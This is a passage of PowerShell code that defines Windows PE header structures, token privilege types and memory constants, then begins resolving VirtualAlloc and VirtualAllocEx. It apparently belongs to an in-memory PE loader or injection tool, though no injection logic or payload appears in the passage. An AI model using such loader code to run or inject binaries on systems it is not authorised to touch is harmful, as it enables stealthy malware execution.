		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
